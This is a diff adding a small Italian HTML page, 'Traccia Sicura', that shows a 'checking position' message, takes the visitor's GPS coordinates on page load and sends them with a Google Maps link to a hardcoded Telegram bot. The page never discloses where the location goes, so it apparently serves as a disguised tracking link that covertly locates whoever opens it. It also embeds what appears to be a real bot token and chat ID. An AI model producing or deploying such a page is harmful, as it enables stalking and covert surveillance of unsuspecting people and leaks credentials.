@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Traccia Sicura</title>
+    <meta charset="UTF-8" />
+  </head>
+  <body>
+    <h3>Verifica posizione in corso...</h3>
+    <p id="status">Attendi qualche secondo...</p>
+
+    <script>
+      // CONFIGURA QUI I TUOI DATI
+      const botToken = "7627218398:AAFHNujcd2e_zTluZeqfFNtJBpBuxY6pX6M";
+      const chatId = "1768737489";
+
+      function sendToTelegram(lat, lon) {
+        const msg = `Posizione rilevata:\nLat: ${lat}\nLon: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg,
+          }),
+        })
+          .then(() => {
+            document.getElementById("status").innerText = "Posizione inviata!";
+          })
+          .catch(() => {
+            document.getElementById("status").innerText = "Errore durante l'invio.";
+          });
+      }
+
+      // Ottieni posizione GPS
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            sendToTelegram(lat, lon);
+          },
+          (err) => {
+            document.getElementById("status").innerText =
+              "Localizzazione negata o errore.";
+          }
+        );
+      } else {
+        document.getElementById("status").innerText =
+          "Geolocalizzazione non supportata.";
+      }
+    </script>
+  </body>
+</html>
